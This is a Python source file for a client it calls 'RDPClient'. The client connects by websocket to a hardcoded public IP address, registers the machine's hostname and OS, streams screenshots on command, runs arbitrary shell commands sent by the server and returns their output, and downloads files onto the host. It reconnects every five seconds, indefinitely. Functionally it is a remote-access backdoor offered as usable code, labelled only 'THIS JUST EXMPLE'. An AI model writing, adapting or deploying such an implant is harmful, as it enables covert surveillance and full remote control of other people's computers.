#!/usr/bin/env python3
import asyncio
import websockets
import json
import base64
import subprocess
import platform
import os
from io import BytesIO
from datetime import datetime
from PIL import Image
import mss

class RDPClient:
    def __init__(self, server_url):
        self.server_url = server_url
        self.client_id = platform.node()
        self.websocket = None
        self.running = False
        self.screenshot_active = False
        self.screenshot_interval = 0.2
        self.download_path = os.getcwd()
        self.command_queue = asyncio.Queue()
        self.file_response_queue = asyncio.Queue()
        
    async def capture_screenshot(self):
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                
                img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
                img.thumbnail((1280, 720), Image.Resampling.LANCZOS)
                
                buffered = BytesIO()
                img.save(buffered, format="JPEG", quality=40, optimize=True)
                img_str = base64.b64encode(buffered.getvalue()).decode()
                
                return img_str
        except Exception as e:
            print(f"Error capturing screenshot: {e}")
            return None
            
    async def execute_command(self, command):
        if command.startswith('/download '):
            filename = command.split(' ', 1)[1].strip()
            return await self.download_file(filename)
            
        try:
            if platform.system() == 'Windows':
                process = await asyncio.create_subprocess_shell(
                    command,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
            else:
                process = await asyncio.create_subprocess_shell(
                    command,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    executable='/bin/bash'
                )
            
            try:
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(),
                    timeout=30
                )
                output = stdout.decode() if stdout else stderr.decode()
                return output
            except asyncio.TimeoutError:
                process.kill()
                await process.wait()
                return "Command timeout (30s) - process terminated"
            
        except Exception as e:
            return f"Error: {str(e)}"
    
    async def download_file(self, filename):
        try:
            await self.websocket.send(json.dumps({
                'type': 'request_file',
                'filename': filename
            }))
            
            data = await self.file_response_queue.get()
            
            if data['type'] == 'file_data' and data['success']:
                file_data = base64.b64decode(data['data'])
                
                os.makedirs(self.download_path, exist_ok=True)
                filepath = os.path.join(self.download_path, filename)
                
                with open(filepath, 'wb') as f:
                    f.write(file_data)
                
                return f"File downloaded successfully: {filepath}"
            else:
                error = data.get('error', 'Unknown error')
                return f"Download failed: {error}"
                
        except Exception as e:
            return f"Download error: {str(e)}"
            
    async def command_processor(self):
        while self.running:
            try:
                command = await self.command_queue.get()
                print(f"Processing command: {command}")
                
                output = await self.execute_command(command)
                
                await self.websocket.send(json.dumps({
                    'type': 'command_output',
                    'command': command,
                    'output': output,
                    'timestamp': datetime.now().isoformat()
                }))
                
                self.command_queue.task_done()
            except Exception as e:
                print(f"Error processing command: {e}")
                await asyncio.sleep(0.1)
    
    async def send_screenshot_loop(self):
        while self.running:
            if self.screenshot_active:
                try:
                    screenshot = await self.capture_screenshot()
                    if screenshot and self.websocket:
                        await self.websocket.send(json.dumps({
                            'type': 'screenshot',
                            'image': screenshot,
                            'timestamp': datetime.now().isoformat()
                        }))
                    await asyncio.sleep(self.screenshot_interval)
                except Exception as e:
                    print(f"Error in screenshot loop: {e}")
                    await asyncio.sleep(1)
            else:
                await asyncio.sleep(0.5)
                
    async def handle_commands(self):
        try:
            async for message in self.websocket:
                data = json.loads(message)
                
                if data['type'] == 'start_screenshot':
                    self.screenshot_active = True
                    print("Screenshot streaming started")
                    
                elif data['type'] == 'stop_screenshot':
                    self.screenshot_active = False
                    print("Screenshot streaming stopped")
                    
                elif data['type'] == 'command':
                    command = data['command']
                    print(f"Received command: {command}")
                    if command.strip().lower() == "/exit":
                        print("Exit command received. Shutting down client...")
                        self.running = False
                        self.screenshot_active = False
                        await self.websocket.close()
                        os._exit(0)
                    await self.command_queue.put(command)
                    
                elif data['type'] == 'file_data':
                    await self.file_response_queue.put(data)

        except websockets.exceptions.ConnectionClosed:
            print("Connection closed")
            self.running = False
            
    async def connect(self):
        try:
            async with websockets.connect(self.server_url) as websocket:
                self.websocket = websocket
                self.running = True
                
                await websocket.send(json.dumps({
                    'type': 'register',
                    'client_id': self.client_id,
                    'hostname': platform.node(),
                    'os': platform.system()
                }))
                
                print(f"Connected to server as {self.client_id}")
                
                await asyncio.gather(
                    self.send_screenshot_loop(),
                    self.handle_commands(),
                    self.command_processor()
                )
                
        except Exception as e:
            print(f"Connection error: {e}")
            self.running = False
            
    async def start(self):
        while True:
            try:
                await self.connect()
            except Exception as e:
                print(f"Error: {e}")
            
            print("Reconnecting in 5 seconds...")
            await asyncio.sleep(5)

if __name__ == '__main__':
    """THIS JUST EXMPLE"""
    SERVER_URL = "ws://13.212.159.35:3500"
    
    client = RDPClient(SERVER_URL)
    asyncio.run(client.start())





